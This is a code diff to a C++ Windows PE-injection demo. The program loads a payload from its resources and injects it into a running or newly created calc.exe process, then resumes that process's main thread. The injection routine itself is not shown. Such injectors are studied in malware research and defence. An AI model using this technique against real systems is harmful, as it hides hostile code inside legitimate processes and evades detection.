@@ -4,6 +4,7 @@
 #include "resource.h"
 #include "inject_pe.h"
 #include "target_util.h"
+#include "enumproc.h"
 
 BYTE* get_raw_payload(OUT SIZE_T &res_size)
 {
@@ -24,6 +25,22 @@ BYTE* get_raw_payload(OUT SIZE_T &res_size)
     return out_buf;
 }
 
+HANDLE make_new_process(HANDLE &mainThread)
+{
+    WCHAR targetPath[MAX_PATH];
+    if (!get_calc_path(targetPath, MAX_PATH)) {
+        return NULL;
+    }
+    //create target process:
+    PROCESS_INFORMATION pi;
+    if (!create_new_process1(targetPath, pi)) return false;
+    printf("PID: %d\n", pi.dwProcessId);
+
+    //store the handle to the main thread, so that we can resume it later
+    mainThread = pi.hThread;
+    return pi.hProcess;
+}
+
 int main(int argc, char *argv[])
 {
     BYTE* res_data = NULL;
@@ -34,16 +51,25 @@ int main(int argc, char *argv[])
         return -1;
     }
 
-    WCHAR targetPath[MAX_PATH];
-    if (!get_calc_path(targetPath, MAX_PATH)) {
-        return -1;
+    //we may inject into existing process
+    HANDLE hProcess = find_running_process(L"calc.exe");
+    HANDLE mainThread = NULL;
+    if (!hProcess) {
+        //or create a new one:
+        hProcess = make_new_process(mainThread);
     }
-
-    if (inject_PE32(targetPath, res_data, res_size, true, true)) {
+    if (inject_PE32(hProcess, res_data, res_size, true)) {
         printf("Injected!\n");
     } else {
         printf("Injection failed\n");
     }
+
+    //in case if the injection was to a new process
+    //we may like to resume it's main thread
+    if (mainThread) {
+        ResumeThread(mainThread);
+    }
+    CloseHandle(hProcess);
     VirtualFree(res_data, res_size, MEM_FREE);
     system("pause");
     return 0;
